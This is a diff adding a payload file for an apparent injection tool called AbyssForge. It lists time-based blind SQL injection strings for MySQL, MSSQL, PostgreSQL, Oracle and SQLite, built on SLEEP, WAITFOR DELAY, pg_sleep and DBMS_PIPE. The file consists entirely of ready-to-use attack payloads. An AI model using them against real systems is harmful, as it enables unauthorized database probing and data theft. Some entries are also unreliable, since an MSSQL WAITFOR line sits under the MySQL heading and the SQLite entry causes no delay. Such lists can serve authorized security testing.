@@ -1,0 +1,27 @@
+# AbyssForge - SQLi Time-based Blind Payloads
+# Target delay: 5 detik
+
+# MySQL
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+') AND SLEEP(5)--
+1 AND SLEEP(5)
+1; WAITFOR DELAY '0:0:5'--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+1' WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+' OR pg_sleep(5)--
+
+# Oracle
+' OR 1=1 AND 1=(SELECT 1 FROM DUAL WHERE 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)--
+1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
+
+# SQLite
+' AND datetime('now')--
